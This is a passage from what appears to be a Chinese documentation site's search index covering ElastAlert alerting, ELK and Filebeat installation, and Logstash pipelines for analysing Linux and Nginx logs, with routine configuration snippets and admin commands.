run_every:","title":"config.yaml\u914d\u7f6e\u6587\u4ef6\u8bf4\u660e"},{"location":"log_analysis/elastalert/#_1","text":"\u914d\u7f6e\u89c4\u5219\uff1avim /etc/elastalert/rules/rule.yaml # \u62a5\u8b66\u7c7b\u578b alert: - email smtp_host: smtp.126.com smtp_port: 25 smtp_auth_file: smtp_auth_file.yaml email_reply_to: email1_address from_addr: email1_address # \u63a5\u53d7\u90ae\u7bb1 email: - email2_address \u521b\u5efa\u90ae\u7bb1\u7684\u8ba4\u8bc1\u6587\u4ef6\uff1avim /etc/elastalert/rules/smtp_auth_file.yaml user: username password: password","title":"\u90ae\u7bb1\u544a\u8b66"},{"location":"log_analysis/elastalert/#_2","text":"elastalert-dingtalk-plugin GitHub\u5730\u5740 \u63d2\u4ef6\u5b89\u88c5 # \u4e0b\u8f7d git clone https://github.com/xuyaoqiang/elastalert-dingtalk-plugin.git # \u590d\u5236\u63d2\u4ef6\u5230elastalert\u4e2d cp -r elastalert-dingtalk-plugin/elastalert_modules/ /etc/elastalert/ \u914d\u7f6e\u89c4\u5219\uff1avim /etc/elastalert/rules/rule.yaml # \u62a5\u8b66\u6a21\u5f0f alert: - elastalert_modules.dingtalk_alert.DingTalkAlerter # \u9489\u9489\u7684webhook\u63a5\u53e3 dingtalk_webhook: dingtalk_msgtype: text \u542f\u7528\u544a\u8b66 python -m elastalert.elastalert --verbose --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml \u914d\u7f6e\u670d\u52a1\u542f\u52a8\uff1avim /etc/systemd/system/elastalert.service [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=cd /etc/elastalert /usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target \u4f18\u5316\u544a\u8b66\u683c\u5f0f # \u6ce8\u610f\u4e0a\u4e0b\u5b57\u6bb5\u5bf9\u5e94 alert_text: | kibana_url: https://hostname:5601/app/kibana alarm_reason: 1\u5206\u949f\u5185login.php\u81f3\u5c11\u88ab\u8bbf\u95ee10\u6b21 alarm_name: {} request_uri: {} request_ip: {} response_status: {} alert_text_args: - name - request - clientip - response alert_text_type: alert_text_only","title":"\u9489\u9489\u544a\u8b66"},{"location":"log_analysis/elastic/","text":"Elastic\u77e5\u8bc6\u4f53\u7cfb ELK\u7cfb\u5217 Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eELK7.2 # \u5bfc\u5165\u79c1\u94a5 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # ElasticSearch rpm -ivh elasticsearch-7.2.0-x86_64.rpm systemctl enable elasticsearch.service systemctl start elasticsearch.service # Kibana rpm -ivh kibana-7.2.0-x86_64.rpm systemctl enable kibana.service systemctl start kibana.service # Logstash rpm -ivh logstash-7.2.0.rpm # \u53ef\u4ee5\u4ee5\u670d\u52a1\u542f\u52a8logstash\uff0c\u4f46\u662f\u4e0d\u5efa\u8bae\u8fd9\u4e48\u505a \u914d\u7f6eElasticSearch vim /etc/elasticsearch/elasticsearch.yml # \u57fa\u7840\u7684\u914d\u7f6e\u9009\u9879 cluster.name: bloodzer0 # \u96c6\u7fa4\u540d\u5b57 node.name: node-1 # \u8282\u70b9\u540d\u5b57 node.attr.rack: r1 # \u8282\u70b9\u5c5e\u6027 path.data: /var/lib/elasticsearch # \u6570\u636e\u8def\u5f84 path.logs: /var/log/elasticsearch # \u65e5\u5fd7\u8def\u5f84 bootstrap.memory_lock: true # \u5185\u5b58\u9501\u5b9a\uff0c\u7981\u7528\u865a\u62df\u5185\u5b58 network.host: 0.0.0.0 # \u7ed1\u5b9a\u4e3b\u673a http.port: 9200 # \u7ed1\u5b9a\u7aef\u53e3 discovery.seed_hosts: [ elk-server ] # \u53d1\u73b0\u4e3b\u673a cluster.initial_master_nodes: [ node-1 ] # \u4e3b\u8282\u70b9 gateway.recover_after_nodes: 3 # \u76f4\u5230N\u4e2a\u8282\u70b9\u542f\u52a8\u6062\u590d\u96c6\u7fa4 action.destructive_requires_name: true # \u5220\u9664\u7d22\u5f15\u9700\u8981\u663e\u793a\u540d\u79f0 vim /etc/elasticsearch/jvm.options # \u8bbe\u7f6e\u5806\u5927\u5c0f\uff0c\u4e00\u822c\u4e0d\u8d85\u8fc7\u7269\u7406\u5b58\u50a8\u768450% -Xms1g -Xmx1g # \u5806\u8f6c\u50a8\u8def\u5f84 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/elasticsearch # jdk * GC logging # JVM\u9519\u8bef\u65e5\u5fd7 -XX:ErrorFile=/var/log/elasticsearch/hs_err_pid%p.log \u67e5\u770bElasticSearch\u96c6\u7fa4 \u96c6\u7fa4\u6982\u8ff0\uff1ahttp://10.10.10.15:9200/ \u96c6\u7fa4\u5065\u5eb7\u6027\uff1ahttp://10.10.10.15:9200/_cat/health?v # green: \u6240\u6709\u4e3b\u5206\u7247\u548c\u4ece\u5206\u7247\u90fd\u53ef\u7528 # yellow: \u6240\u6709\u4e3b\u5206\u7247\u53ef\u7528\uff0c\u4f46\u5b58\u5728\u4e0d\u53ef\u7528\u7684\u4ece\u5206\u7247 # red: \u67d0\u4e9b\u6570\u636e\u7531\u4e8e\u67d0\u79cd\u539f\u56e0\u4e0d\u53ef\u7528 \u67e5\u770b\u7d22\u5f15\uff1ahttp://10.10.10.15:9200/_cat/indices?v \u914d\u7f6eElasticSearch Template \u53c2\u8003\uff1ahttps://www.elastic.co/guide/en/elasticsearch/reference/current/indices-templates.html \u521b\u5efaTemplate curl -X PUT 10.10.10.15:9200/_template/template_name -H 'Content-Type: application/json' -d' { index_patterns : [ te* , bar* ], settings : { number_of_shards : 1 }, mappings : { _source : { enabled : false }, properties : { host_name : { type : keyword }, created_at : { type : date , format : EEE MMM dd HH:mm:ss Z yyyy } } } } ' \u4fee\u6539Template\uff1a\u4e0e\u521b\u5efatemplate\u4e00\u81f4\u3002 \u5220\u9664Template curl -X DELETE 10.10.10.15:9200/_template/template_name \u914d\u7f6eElasticSearch Mapping \u53c2\u8003\uff1ahttps://www.elastic.co/guide/en/elasticsearch/reference/current/indices-put-mapping.html \u914d\u7f6eElasticSearch\u7d22\u5f15 \u53c2\u8003\uff1ahttps://www.elastic.co/guide/en/elasticsearch/reference/current/indices-create-index.html \u5173\u95ed/\u5f00\u542f\u7d22\u5f15 curl -X POST 10.10.10.15:9200/my_index/_close curl -X POST 10.10.10.15:9200/my_index/_open \u5b9a\u671f\u6e05\u7406\u7d22\u5f15 import os import datetime day_ago = (datetime.datetime.now() - datetime.timedelta(days=3)).strftime( %Y.%m.%d ) command = 'curl -XDELETE http://10.10.10.15/index_name-%s ' % day_ago os.system(command) ElasticSearch\u5e38\u7528\u63d2\u4ef6 Head \u914d\u7f6eKibana vim /etc/kibana/kibana.yml server.port: 5601 # \u7ed1\u5b9a\u7aef\u53e3 server.host: 0.0.0.0 # \u7ed1\u5b9a\u4e3b\u673a elasticsearch.hosts: [ http://10.10.10.15:9200 ] # ElasticSearch\u5730\u5740 \u914d\u7f6eKibana\u56fe\u8868 \u53c2\u8003\uff1ahttps://www.elastic.co/cn/products/kibana/features Timelion \u4ee5\u4e0b\u6848\u4f8b\u5728wazuh\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u7684\u65e5\u5fd7\u4e2d\u8fdb\u884c .es(index=wazuh-alerts-3.x*,q='rule.description: PAM: Login session opened. ').label(\u767b\u5f55),.es(index=wazuh-alerts-3.x*,q='rule.description: PAM: Login session closed. ').label(\u9000\u51fa) Kibana\u4e2d\u7684Grok Debugger \u5728Dev Tools\u4e2d\uff1ahttp://10.10.10.15:5601/app/kibana#/dev_tools/grokdebugger \u914d\u7f6eLogstash node.name: test # \u8282\u70b9\u540d\u79f0 path.data: /var/lib/logstash # \u6570\u636e\u5b58\u50a8\u76ee\u5f55 pipeline.id: main # pipeline ID pipeline.workers: 2 # \u8f93\u51fa\u901a\u9053\u7684worker\u6570\u91cf\uff0c\u9ed8\u8ba4\u4e3aCPU\u6838\u6570 pipeline.batch.size: 125 # \u6279\u5904\u7406\u6570\u636e\u7684\u5927\u5c0f pipeline.batch.delay: 50 # \u6279\u5904\u7406\u6570\u636e\u7684\u5ef6\u8fdf config.reload.automatic: false # \u662f\u5426\u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\u88ab\u4fee\u6539\u7684\u914d\u7f6e\u6587\u4ef6 config.reload.interval: 3s # \u914d\u7f6e\u6587\u4ef6\u68c0\u67e5\u95f4\u9694\u65f6\u95f4 \u6d4b\u8bd5Logstash /usr/share/logstash/bin/logstash -e 'input { stdin {} } output { stdout {} }' Logstash Filter \u914d\u7f6eLogstash Patterns Logstash Patterns\u76ee\u5f55\uff1a/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.1.2/patterns/ Logstash\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684Pattern filter { grok { patterns_dir = [ patterns_dir ] } } \u4f7f\u7528geoip\u89e3\u6790IP\u5730\u5740 filter { geoip { source = remote_addr # \u6307\u5b9a\u7528\u6765\u89e3\u6790\u7684\u539fIP\u5b57\u6bb5 } } \u4f7f\u7528codec/multiline\u5408\u5e76\u591a\u884c\u6570\u636e filter { multiline { pattern = ^%{TIMESTAMP_ISO8601} negate = ture what = previous # \u5982\u679c\u4e0d\u662f\u4ee5\u65f6\u95f4\u5f00\u5934\u7684\u884c\u5408\u5e76\u5230\u4e0a\u4e00\u884c } } # \u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u5199\u6cd5 filter { multiline { pattern = %{TIMESTAMP_ISO8601} what = next # \u5982\u679c\u662f\u4ee5\u65f6\u95f4\u5f00\u5934\u7684\u884c\uff0c\u5219\u5f00\u59cb\u65b0\u7684\u4e00\u884c } } ELK\u8ba4\u8bc1\u4f53\u7cfb Nginx HTTP Auth Basic \u7cfb\u7edf\u5b89\u88c5Nginx # \u5b89\u88c5nginx\u4e0enginx\u8ba4\u8bc1\u6a21\u5757 yum install epel-release -y yum install nginx.x86_64 httpd-tools.x86_64 -y Nginx\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff1avim /etc/nginx/nginx.conf server { listen 8080; server_name kibana; auth_basic Restricted Access ; auth_basic_user_file /etc/nginx/kibana-user; location / { proxy_pass http://10.10.10.15:5601; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade'; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } \u914d\u7f6e\u8d26\u53f7\u5bc6\u7801 # \u8bbe\u7f6e\u8d26\u53f7\u5bc6\u7801 htpasswd -cm /etc/nginx/kibana-user username # \u91cd\u542fnginx\u670d\u52a1 systemctl restart nginx.service Nginx Lua SearchGuard \u5b98\u65b9\u6587\u6863 Shield \u5b98\u65b9\u6587\u6863 XPack Beats\u7cfb\u5217 Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eFilebeat rpm -ivh filebeat-7.2.0-x86_64.rpm \u914d\u7f6eFilebeat \u5220\u9664\u4e0d\u5fc5\u8981\u7684\u5b57\u6bb5\uff1a\u5728Filebeat7.X\u7684\u7248\u672c\u4e2d\uff0c\u9ed8\u8ba4\u7684@timestamp\u3001type\u3001host\u3001agent\u3001ecs\u8fd9\u4e9b\u5b57\u6bb5\u662f\u4e0d\u80fd\u5220\u9664\u7684\u3002 processors: - drop_fields: fields: [ field ] Filebeat\u5b9e\u73b0\u591a\u884c\u5408\u5e76 - document_type: tomcat paths: - /var/log/java/log #\u65e5\u5fd7\u6587\u4ef6\u5730\u5740 input_type: log #\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6 tail_files: true #\u4ee5\u6587\u4ef6\u672b\u5c3e\u5f00\u59cb\u8bfb\u53d6\u6570\u636e multiline: pattern: ^\\d{4} match: after negate: true \u89e3\u51b3ELK\u5e38\u89c1\u95ee\u9898 ElasticSearch\u8111\u88c2 \u53c2\u8003\u8d44\u6599 Elasticsearch\u53f2\u4e0a\u6700\u5168\u6700\u5e38\u7528\u5de5\u5177\u6e05\u5355 Elasticsearch\u5b66\u4e60\uff081\uff09\u2014\u2014 \u7b80\u4ecb ES\u8111\u88c2\u95ee\u9898\u5206\u6790\u53ca\u4f18\u5316 Logstash\u6700\u4f73\u5b9e\u8df5 \u5982\u4f55\u5728ELK\u4e2d\u89e3\u6790\u5404\u7c7b\u65e5\u5fd7\u6587\u4ef6 ELK\u5b66\u4e60\u7b14\u8bb0\u4e4bF5\u5229\u7528ELK\u8fdb\u884c\u5e94\u7528\u6570\u636e\u6316\u6398\u7cfb\u5217(1)-HTTP ELK\u5b66\u4e60\u7b14\u8bb0\u4e4bF5\u5229\u7528EELK\u8fdb\u884c\u5e94\u7528\u6570\u636e\u6316\u6398\u7cfb\u5217(2)-DNS","title":"Elastic\u77e5\u8bc6\u4f53\u7cfb"},{"location":"log_analysis/elastic/#elastic","text":"","title":"Elastic\u77e5\u8bc6\u4f53\u7cfb"},{"location":"log_analysis/elastic/#elk","text":"","title":"ELK\u7cfb\u5217"},{"location":"log_analysis/elastic/#centos7elk72","text":"# \u5bfc\u5165\u79c1\u94a5 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # ElasticSearch rpm -ivh elasticsearch-7.2.0-x86_64.rpm systemctl enable elasticsearch.service systemctl start elasticsearch.service # Kibana rpm -ivh kibana-7.2.0-x86_64.rpm systemctl enable kibana.service systemctl start kibana.service # Logstash rpm -ivh logstash-7.2.0.rpm # \u53ef\u4ee5\u4ee5\u670d\u52a1\u542f\u52a8logstash\uff0c\u4f46\u662f\u4e0d\u5efa\u8bae\u8fd9\u4e48\u505a","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eELK7.2"},{"location":"log_analysis/elastic/#elasticsearch","text":"vim /etc/elasticsearch/elasticsearch.yml # \u57fa\u7840\u7684\u914d\u7f6e\u9009\u9879 cluster.name: bloodzer0 # \u96c6\u7fa4\u540d\u5b57 node.name: node-1 # \u8282\u70b9\u540d\u5b57 node.attr.rack: r1 # \u8282\u70b9\u5c5e\u6027 path.data: /var/lib/elasticsearch # \u6570\u636e\u8def\u5f84 path.logs: /var/log/elasticsearch # \u65e5\u5fd7\u8def\u5f84 bootstrap.memory_lock: true # \u5185\u5b58\u9501\u5b9a\uff0c\u7981\u7528\u865a\u62df\u5185\u5b58 network.host: 0.0.0.0 # \u7ed1\u5b9a\u4e3b\u673a http.port: 9200 # \u7ed1\u5b9a\u7aef\u53e3 discovery.seed_hosts: [ elk-server ] # \u53d1\u73b0\u4e3b\u673a cluster.initial_master_nodes: [ node-1 ] # \u4e3b\u8282\u70b9 gateway.recover_after_nodes: 3 # \u76f4\u5230N\u4e2a\u8282\u70b9\u542f\u52a8\u6062\u590d\u96c6\u7fa4 action.destructive_requires_name: true # \u5220\u9664\u7d22\u5f15\u9700\u8981\u663e\u793a\u540d\u79f0 vim /etc/elasticsearch/jvm.options # \u8bbe\u7f6e\u5806\u5927\u5c0f\uff0c\u4e00\u822c\u4e0d\u8d85\u8fc7\u7269\u7406\u5b58\u50a8\u768450% -Xms1g -Xmx1g # \u5806\u8f6c\u50a8\u8def\u5f84 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/elasticsearch # jdk * GC logging # JVM\u9519\u8bef\u65e5\u5fd7 -XX:ErrorFile=/var/log/elasticsearch/hs_err_pid%p.log","title":"\u914d\u7f6eElasticSearch"},{"location":"log_analysis/elastic/#elasticsearch_1","text":"\u96c6\u7fa4\u6982\u8ff0\uff1ahttp://10.10.10.15:9200/ \u96c6\u7fa4\u5065\u5eb7\u6027\uff1ahttp://10.10.10.15:9200/_cat/health?v # green: \u6240\u6709\u4e3b\u5206\u7247\u548c\u4ece\u5206\u7247\u90fd\u53ef\u7528 # yellow: \u6240\u6709\u4e3b\u5206\u7247\u53ef\u7528\uff0c\u4f46\u5b58\u5728\u4e0d\u53ef\u7528\u7684\u4ece\u5206\u7247 # red: \u67d0\u4e9b\u6570\u636e\u7531\u4e8e\u67d0\u79cd\u539f\u56e0\u4e0d\u53ef\u7528 \u67e5\u770b\u7d22\u5f15\uff1ahttp://10.10.10.15:9200/_cat/indices?v","title":"\u67e5\u770bElasticSearch\u96c6\u7fa4"},{"location":"log_analysis/elastic/#elasticsearch-template","text":"\u53c2\u8003\uff1ahttps://www.elastic.co/guide/en/elasticsearch/reference/current/indices-templates.html \u521b\u5efaTemplate curl -X PUT 10.10.10.15:9200/_template/template_name -H 'Content-Type: application/json' -d' { index_patterns : [ te* , bar* ], settings : { number_of_shards : 1 }, mappings : { _source : { enabled : false }, properties : { host_name : { type : keyword }, created_at : { type : date , format : EEE MMM dd HH:mm:ss Z yyyy } } } } ' \u4fee\u6539Template\uff1a\u4e0e\u521b\u5efatemplate\u4e00\u81f4\u3002 \u5220\u9664Template curl -X DELETE 10.10.10.15:9200/_template/template_name","title":"\u914d\u7f6eElasticSearch Template"},{"location":"log_analysis/elastic/#elasticsearch-mapping","text":"\u53c2\u8003\uff1ahttps://www.elastic.co/guide/en/elasticsearch/reference/current/indices-put-mapping.html","title":"\u914d\u7f6eElasticSearch Mapping"},{"location":"log_analysis/elastic/#elasticsearch_2","text":"\u53c2\u8003\uff1ahttps://www.elastic.co/guide/en/elasticsearch/reference/current/indices-create-index.html \u5173\u95ed/\u5f00\u542f\u7d22\u5f15 curl -X POST 10.10.10.15:9200/my_index/_close curl -X POST 10.10.10.15:9200/my_index/_open \u5b9a\u671f\u6e05\u7406\u7d22\u5f15 import os import datetime day_ago = (datetime.datetime.now() - datetime.timedelta(days=3)).strftime( %Y.%m.%d ) command = 'curl -XDELETE http://10.10.10.15/index_name-%s ' % day_ago os.system(command)","title":"\u914d\u7f6eElasticSearch\u7d22\u5f15"},{"location":"log_analysis/elastic/#elasticsearch_3","text":"Head","title":"ElasticSearch\u5e38\u7528\u63d2\u4ef6"},{"location":"log_analysis/elastic/#kibana","text":"vim /etc/kibana/kibana.yml server.port: 5601 # \u7ed1\u5b9a\u7aef\u53e3 server.host: 0.0.0.0 # \u7ed1\u5b9a\u4e3b\u673a elasticsearch.hosts: [ http://10.10.10.15:9200 ] # ElasticSearch\u5730\u5740","title":"\u914d\u7f6eKibana"},{"location":"log_analysis/elastic/#kibana_1","text":"\u53c2\u8003\uff1ahttps://www.elastic.co/cn/products/kibana/features","title":"\u914d\u7f6eKibana\u56fe\u8868"},{"location":"log_analysis/elastic/#timelion","text":"\u4ee5\u4e0b\u6848\u4f8b\u5728wazuh\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u7684\u65e5\u5fd7\u4e2d\u8fdb\u884c .es(index=wazuh-alerts-3.x*,q='rule.description: PAM: Login session opened. ').label(\u767b\u5f55),.es(index=wazuh-alerts-3.x*,q='rule.description: PAM: Login session closed. ').label(\u9000\u51fa)","title":"Timelion"},{"location":"log_analysis/elastic/#kibanagrok-debugger","text":"\u5728Dev Tools\u4e2d\uff1ahttp://10.10.10.15:5601/app/kibana#/dev_tools/grokdebugger","title":"Kibana\u4e2d\u7684Grok Debugger"},{"location":"log_analysis/elastic/#logstash","text":"node.name: test # \u8282\u70b9\u540d\u79f0 path.data: /var/lib/logstash # \u6570\u636e\u5b58\u50a8\u76ee\u5f55 pipeline.id: main # pipeline ID pipeline.workers: 2 # \u8f93\u51fa\u901a\u9053\u7684worker\u6570\u91cf\uff0c\u9ed8\u8ba4\u4e3aCPU\u6838\u6570 pipeline.batch.size: 125 # \u6279\u5904\u7406\u6570\u636e\u7684\u5927\u5c0f pipeline.batch.delay: 50 # \u6279\u5904\u7406\u6570\u636e\u7684\u5ef6\u8fdf config.reload.automatic: false # \u662f\u5426\u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\u88ab\u4fee\u6539\u7684\u914d\u7f6e\u6587\u4ef6 config.reload.interval: 3s # \u914d\u7f6e\u6587\u4ef6\u68c0\u67e5\u95f4\u9694\u65f6\u95f4","title":"\u914d\u7f6eLogstash"},{"location":"log_analysis/elastic/#logstash_1","text":"/usr/share/logstash/bin/logstash -e 'input { stdin {} } output { stdout {} }'","title":"\u6d4b\u8bd5Logstash"},{"location":"log_analysis/elastic/#logstash-filter","text":"","title":"Logstash Filter"},{"location":"log_analysis/elastic/#logstash-patterns","text":"Logstash Patterns\u76ee\u5f55\uff1a/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.1.2/patterns/ Logstash\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684Pattern filter { grok { patterns_dir = [ patterns_dir ] } }","title":"\u914d\u7f6eLogstash Patterns"},{"location":"log_analysis/elastic/#geoipip","text":"filter { geoip { source = remote_addr # \u6307\u5b9a\u7528\u6765\u89e3\u6790\u7684\u539fIP\u5b57\u6bb5 } }","title":"\u4f7f\u7528geoip\u89e3\u6790IP\u5730\u5740"},{"location":"log_analysis/elastic/#codecmultiline","text":"filter { multiline { pattern = ^%{TIMESTAMP_ISO8601} negate = ture what = previous # \u5982\u679c\u4e0d\u662f\u4ee5\u65f6\u95f4\u5f00\u5934\u7684\u884c\u5408\u5e76\u5230\u4e0a\u4e00\u884c } } # \u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u5199\u6cd5 filter { multiline { pattern = %{TIMESTAMP_ISO8601} what = next # \u5982\u679c\u662f\u4ee5\u65f6\u95f4\u5f00\u5934\u7684\u884c\uff0c\u5219\u5f00\u59cb\u65b0\u7684\u4e00\u884c } }","title":"\u4f7f\u7528codec/multiline\u5408\u5e76\u591a\u884c\u6570\u636e"},{"location":"log_analysis/elastic/#elk_1","text":"","title":"ELK\u8ba4\u8bc1\u4f53\u7cfb"},{"location":"log_analysis/elastic/#nginx-http-auth-basic","text":"\u7cfb\u7edf\u5b89\u88c5Nginx # \u5b89\u88c5nginx\u4e0enginx\u8ba4\u8bc1\u6a21\u5757 yum install epel-release -y yum install nginx.x86_64 httpd-tools.x86_64 -y Nginx\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff1avim /etc/nginx/nginx.conf server { listen 8080; server_name kibana; auth_basic Restricted Access ; auth_basic_user_file /etc/nginx/kibana-user; location / { proxy_pass http://10.10.10.15:5601; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade'; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } \u914d\u7f6e\u8d26\u53f7\u5bc6\u7801 # \u8bbe\u7f6e\u8d26\u53f7\u5bc6\u7801 htpasswd -cm /etc/nginx/kibana-user username # \u91cd\u542fnginx\u670d\u52a1 systemctl restart nginx.service","title":"Nginx HTTP Auth Basic"},{"location":"log_analysis/elastic/#nginx-lua","text":"","title":"Nginx Lua"},{"location":"log_analysis/elastic/#searchguard","text":"\u5b98\u65b9\u6587\u6863","title":"SearchGuard"},{"location":"log_analysis/elastic/#shield","text":"\u5b98\u65b9\u6587\u6863","title":"Shield"},{"location":"log_analysis/elastic/#xpack","text":"","title":"XPack"},{"location":"log_analysis/elastic/#beats","text":"","title":"Beats\u7cfb\u5217"},{"location":"log_analysis/elastic/#centos7filebeat","text":"rpm -ivh filebeat-7.2.0-x86_64.rpm","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eFilebeat"},{"location":"log_analysis/elastic/#filebeat","text":"\u5220\u9664\u4e0d\u5fc5\u8981\u7684\u5b57\u6bb5\uff1a\u5728Filebeat7.X\u7684\u7248\u672c\u4e2d\uff0c\u9ed8\u8ba4\u7684@timestamp\u3001type\u3001host\u3001agent\u3001ecs\u8fd9\u4e9b\u5b57\u6bb5\u662f\u4e0d\u80fd\u5220\u9664\u7684\u3002 processors: - drop_fields: fields: [ field ]","title":"\u914d\u7f6eFilebeat"},{"location":"log_analysis/elastic/#filebeat_1","text":"- document_type: tomcat paths: - /var/log/java/log #\u65e5\u5fd7\u6587\u4ef6\u5730\u5740 input_type: log #\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6 tail_files: true #\u4ee5\u6587\u4ef6\u672b\u5c3e\u5f00\u59cb\u8bfb\u53d6\u6570\u636e multiline: pattern: ^\\d{4} match: after negate: true","title":"Filebeat\u5b9e\u73b0\u591a\u884c\u5408\u5e76"},{"location":"log_analysis/elastic/#elk_2","text":"","title":"\u89e3\u51b3ELK\u5e38\u89c1\u95ee\u9898"},{"location":"log_analysis/elastic/#elasticsearch_4","text":"","title":"ElasticSearch\u8111\u88c2"},{"location":"log_analysis/elastic/#_1","text":"Elasticsearch\u53f2\u4e0a\u6700\u5168\u6700\u5e38\u7528\u5de5\u5177\u6e05\u5355 Elasticsearch\u5b66\u4e60\uff081\uff09\u2014\u2014 \u7b80\u4ecb ES\u8111\u88c2\u95ee\u9898\u5206\u6790\u53ca\u4f18\u5316 Logstash\u6700\u4f73\u5b9e\u8df5 \u5982\u4f55\u5728ELK\u4e2d\u89e3\u6790\u5404\u7c7b\u65e5\u5fd7\u6587\u4ef6 ELK\u5b66\u4e60\u7b14\u8bb0\u4e4bF5\u5229\u7528ELK\u8fdb\u884c\u5e94\u7528\u6570\u636e\u6316\u6398\u7cfb\u5217(1)-HTTP ELK\u5b66\u4e60\u7b14\u8bb0\u4e4bF5\u5229\u7528EELK\u8fdb\u884c\u5e94\u7528\u6570\u636e\u6316\u6398\u7cfb\u5217(2)-DNS","title":"\u53c2\u8003\u8d44\u6599"},{"location":"log_analysis/elastic_example/","text":"Elastic\u65e5\u5fd7\u5206\u6790\u6848\u4f8b ELK\u5206\u6790Linux\u7cfb\u7edf\u65e5\u5fd7 \u521b\u5efaLogstash\u914d\u7f6e\u6587\u4ef6\uff1avim /etc/logstash/conf.d/syslog.conf input { file { path = [ /var/log/secure ] type = syslog } } filter { if [type] == syslog { grok { match = { message = %{SYSLOGPAMSESSION} } } mutate { remove_field = [ message ] } } } output { if [type] == syslog and _grokparsefailure not in [tags] { elasticsearch { hosts = [ 10.10.10.15:9200 ] index = logstash-syslog-%{+YYYY.MM} } } } \u6267\u884clogstash /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d --config.reload.automatic # -f: \u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u6216\u6587\u4ef6\u5939 # --config.reload.automatic: \u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\u88ab\u4fee\u6539\u7684\u914d\u7f6e\u6587\u4ef6 # -t: \u6d4b\u8bd5\u914d\u7f6e\u6587\u4ef6 ELK+Filebeat\u5206\u6790Nginx\u65e5\u5fd7 Nginx\u65e5\u5fd7\u4e3aJSON\u683c\u5f0f\uff0c\u6240\u4ee5\u9700\u8981\u5728Filebeat\u4e2d\u8fdb\u884c\u914d\u7f6e\u89e3\u6790\u3002 \u914d\u7f6efilebeat\uff1avim /etc/filebeat/filebeat.yml filebeat.inputs: - type: log enabled: true paths: - /usr/local/nginx/logs/access.log json.keys_under_root: true json.overwrite_keys: true # \u6ce8\u91cakibana\u4e0eelasticsearch\u7684\u8f93\u51fa output.logstash: hosts: [ 10.10.10.15:5044 ] \u914d\u7f6eLogstash input { beats { port = 5044 type = nginx } } filter { if [type] == nginx { mutate { remove_field = [ message ] } } geoip { source = remote_addr } } output { if [type] == nginx { elasticsearch { hosts = [ 10.10.10.15:9200 ] index = logstash-nginx-%{+YYYY.MM} } } }","title":"Elastic\u65e5\u5fd7\u5206\u6790\u6848\u4f8b"},{"location":"log_analysis/elastic_example/#elastic","text":"","title":"Elastic\u65e5\u5fd7\u5206\u6790\u6848\u4f8b"},{"location":"log_analysis/elastic_example/#elklinux","text":"\u521b\u5efaLogstash\u914d\u7f6e\u6587\u4ef6\uff1avim /etc/logstash/conf.d/syslog.conf input { file { path = [ /var/log/secure ] type = syslog } } filter { if [type] == syslog { grok { match = { message = %{SYSLOGPAMSESSION} } } mutate { remove_field = [ message ] } } } output { if [type] == syslog and _grokparsefailure not in [tags] { elasticsearch { hosts = [ 10.10.10.15:9200 ] index = logstash-syslog-%{+YYYY.MM} } } } \u6267\u884clogstash /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d --config.reload.automatic # -f: \u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u6216\u6587\u4ef6\u5939 # --config.reload.automatic: \u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\u88ab\u4fee\u6539\u7684\u914d\u7f6e\u6587\u4ef6 # -t: \u6d4b\u8bd5\u914d\u7f6e\u6587\u4ef6","title":"ELK\u5206\u6790Linux\u7cfb\u7edf\u65e5\u5fd7"},{"location":"log_analysis/elastic_example/#elkfilebeatnginx","text":"Nginx\u65e5\u5fd7\u4e3aJSON\u683c\u5f0f\uff0c\u6240\u4ee5\u9700\u8981\u5728Filebeat\u4e2d\u8fdb\u884c\u914d\u7f6e\u89e3\u6790\u3002 \u914d\u7f6efilebeat\uff1avim /etc/filebeat/filebeat.yml filebeat.inputs: - type: log enabled: true paths: - /usr/local/nginx/logs/access.log json.keys_under_root: true json.overwrite_keys: true # \u6ce8\u91cakibana\u4e0eelasticsearch\u7684\u8f93\u51fa output.logstash: hosts: [ 10.10.10.15:5044 ] \u914d\u7f6eLogstash input { beats { port = 5044 type = nginx } } filter { if [type] == nginx { mutate { remove_field = [ message ] } } geoip { source = remote_addr } } output { if [type] == nginx { elasticsearch { hosts = [ 10.10.10.15:9200 ] index = logstash-nginx-%{+YYYY.MM} } } }","title":"ELK+Filebeat\u5206\u6790Nginx\u65e5\u5fd7"},{"location":"log_analysis/grokdebugger/","text":"\u672c\u5730\u642d\u5efaGrokDebug github\u5730\u5740 